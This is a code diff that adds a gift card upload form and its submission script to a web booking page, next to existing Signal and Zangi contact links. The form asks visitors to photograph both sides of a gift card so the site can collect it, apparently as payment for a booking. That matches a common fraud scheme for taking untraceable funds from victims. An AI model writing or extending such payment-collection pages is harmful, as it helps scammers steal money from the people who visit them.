@@ -82,6 +82,24 @@
     <a id="signalLink" class="signal" target="_blank">Signal</a>
     <a id="zangiLink" class="zangi" target="_blank">Zangi</a>
   </div>
+  <section id="gift-card-upload" style="margin-top: 2rem;">
+  <h2>Upload Your Gift Card</h2>
+  <p>Please upload clear images of the front and back of your gift card. <strong>Make sure the image is clear and readable.</strong></p>
+  
+  <form id="giftCardForm" enctype="multipart/form-data">
+    <input type="hidden" name="booking_id" id="booking_id" value="">
+    
+    <label>Front of Gift Card:</label><br>
+    <input type="file" name="front_card" accept="image/*" required><br><br>
+    
+    <label>Back of Gift Card:</label><br>
+    <input type="file" name="back_card" accept="image/*" required><br><br>
+    
+    <button type="submit">Submit Gift Card</button>
+  </form>
+
+  <p id="uploadStatus"></p>
+  </section>
 
   <a class="back-home" href="/">← Back to Homepage</a>
 
@@ -106,6 +124,30 @@
         alert("Booking info copied to clipboard!");
       });
     }
+  // Auto-fill booking ID from URL param (if it's in ?booking_id=XYZ)
+  const urlParams = new URLSearchParams(window.location.search);
+  const bookingId = urlParams.get('booking_id');
+  if (bookingId) {
+    document.getElementById('booking_id').value = bookingId;
+  }
+
+  document.getElementById("giftCardForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    
+    const form = e.target;
+    const formData = new FormData(form);
+
+    const response = await fetch("/api/upload-gift-card", {
+      method: "POST",
+      body: formData
+    });
+
+    if (response.ok) {
+      document.getElementById("uploadStatus").innerText = "Gift card uploaded successfully!";
+    } else {
+      document.getElementById("uploadStatus").innerText = "There was an error uploading your gift card.";
+    }
+  });
   </script>
 </body>
   </html>
